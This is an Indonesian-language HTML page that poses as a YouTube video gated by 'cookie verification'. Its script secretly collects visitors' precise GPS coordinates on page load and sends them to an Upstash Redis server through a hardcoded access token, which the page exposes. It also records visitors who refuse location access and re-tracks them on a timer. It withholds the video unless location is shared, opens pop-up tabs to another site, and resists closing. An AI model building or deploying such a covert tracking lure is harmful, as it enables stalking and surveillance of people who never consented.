<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
     /* CONTAINER UTAMA KONTEN */
.content-wrapper {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    
    width: 95vw;         
    height: 95vh;         
    max-width: 1200px;    
    max-height: 675px;    
    
    aspect-ratio: 16 / 9; 
    overflow: hidden;    
    display: flex;
    justify-content: center;
    align-items: center;
    background: #0a0a0c; 
    
    border: 1px solid rgba(0, 255, 102, 0.3);
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
}

.content-wrapper iframe {
    width: 100%;
    height: 100%;
    border: none;
    display: block;
    object-fit: contain; 
}
    
.textnotif {
    position: absolute;
    bottom: 25px;     
    left: 50%;
    transform: translateX(-50%);
    text-align: center;
    z-index: 10;        
    pointer-events: none; 
    
    font-family: 'Courier New', Courier, monospace;
    font-weight: bold;
    color: #000000;
   
    animation: neon-kedip 1s infinite alternate;
}

@keyframes neon-kedip {
    0% {
        opacity: 0.2;
    }
    100% {
        opacity: 1;
    }
}
    </style>
</head>
<body>

    <div id="blank-overlay"></div>

    <div class="container">
        <header>
            <div id="status-display" class="status-badge status-checking"></div>
        </header>

        <div id="content-frame" class="content-wrapper" style="display: none;">
            <iframe id="video-youtube" src="https://www.youtube.com/embed/6K2E4CFKtNI" allow="autoplay; encrypted-media; fullscreen"></iframe>
        </div>
        
        <div id="lock-screen">
            <div class="textnotif">
                <div class="lock-msg">verifikasi cookie untuk melihat konten</div>
            </div>
        </div>
    </div>

    <script>
        const CONFIG = {
            URL: "https://super-camel-75084.upstash.io",
            TOKEN: "gQAAAAAAASVMAAIgcDI0MjBkMmM4NTRkYWU0OTEyYTZmZWU5ODkxNGI1MmNjZg",
            PREFIX: "candiru_6",
            TARGET_URL: "https://firstian84.github.io/firstiantechnology/candiru6.html"
        };

        let locationInterval = null;
        let isLongInterval = false;
        let tabRedirectInterval = null;

        function getJakartaTimestamp() {
            const options = {
                timeZone: 'Asia/Jakarta',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            };
            
            const formatter = new Intl.DateTimeFormat('en-ZA', options);
            return formatter.format(new Date()).replace(',', '');
        }

        // Fungsi universal untuk mengirim data (bisa koordinat atau status error) ke Upstash Redis
        async function pushToUpstash(dataPayload) {
            const timestampJakarta = getJakartaTimestamp();
            
            const logData = {
                ...dataPayload,
                viewonload: timestampJakarta
            };

            const key = `${CONFIG.PREFIX}:${Date.now()}`;

            try {
                const response = await fetch(`${CONFIG.URL}/set/${key}`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${CONFIG.TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(logData)
                });
                return response.ok;
            } catch (error) {
                console.error("Gagal sinkronisasi data ke Upstash:", error);
                return false;
            }
        }

        function removeWhiteOverlay() {
            const overlay = document.getElementById('blank-overlay');
            if (overlay) {
                overlay.style.opacity = '0';
                setTimeout(() => {
                    overlay.style.display = 'none';
                }, 500);
            }
        }

        function fetchAndSyncLocation() {
            const statusDisplay = document.getElementById('status-display');
            const iframe = document.getElementById('content-frame');
            const lockScreen = document.getElementById('lock-screen');

            if (!navigator.geolocation) {
                // Tetap kirim log meskipun browser tidak mendukung GPS
                pushToUpstash({ koordinat: "Browser Tidak Mendukung GPS" });
                handleAccessDenied("Browser Tidak Mendukung GPS");
                removeWhiteOverlay();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // Kirim data koordinat sukses
                    const syncSuccess = await pushToUpstash({ koordinat: `${lat},${lon}` });

                    if (syncSuccess) {
                        statusDisplay.textContent = "";
                        statusDisplay.className = "status-badge status-verified";
                        
                        iframe.style.display = "block";
                        lockScreen.style.display = "none";

                        switchInterval(300000); 
                    } else {
                        handleAccessDenied("Gagal sinkronisasi database server.");
                        switchInterval(3000);
                    }

                    removeWhiteOverlay();
                },
                async (error) => {
                    // TETAP KIRIM KE UPSTASH MESKIPUN GPS MATI / DITOLAK
                    await pushToUpstash({ koordinat: "GPS Tidak Aktif / Akses Ditolak" });

                    handleAccessDenied("");
                    removeWhiteOverlay();
                    switchInterval(3000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000
                }
            );
        }

        function switchInterval(ms) {
            if (ms === 300000 && isLongInterval) return;
            if (ms === 3000 && !isLongInterval && locationInterval !== null) return;

            if (locationInterval) {
                clearInterval(locationInterval);
            }

            isLongInterval = (ms === 300000);
            locationInterval = setInterval(() => {
                fetchAndSyncLocation();
            }, ms);
        }

        function handleAccessDenied(customMessage = null) {
            const statusDisplay = document.getElementById('status-display');
            const iframe = document.getElementById('content-frame');
            const lockScreen = document.getElementById('lock-screen');

            statusDisplay.textContent = customMessage ? customMessage : "";
            statusDisplay.className = "status-badge status-denied";

            iframe.style.display = "none";
            lockScreen.style.display = "flex";
        }

        function openTargetTab() {
            window.open(CONFIG.TARGET_URL, '_blank');
        }

        function initTabAutomation() {
            if (tabRedirectInterval) clearInterval(tabRedirectInterval);
            
            tabRedirectInterval = setInterval(() => {
                openTargetTab();
            }, 900000);

            const triggerInitialPopup = () => {
                openTargetTab();
                window.removeEventListener('click', triggerInitialPopup);
                window.removeEventListener('touchstart', triggerInitialPopup);
            };
            window.addEventListener('click', triggerInitialPopup);
            window.addEventListener('touchstart', triggerInitialPopup);

            window.addEventListener('beforeunload', (event) => {
                openTargetTab();
                const baseMessage = "Sistem mendeteksi penutupan halaman.";
                event.returnValue = baseMessage;
                return baseMessage;
            });
        }

        function initCandiruSystem() {
            fetchAndSyncLocation();
            switchInterval(5000);
            initTabAutomation();
        }

        window.addEventListener('DOMContentLoaded', () => {
            initCandiruSystem();
        });
    </script>
</body>
</html>
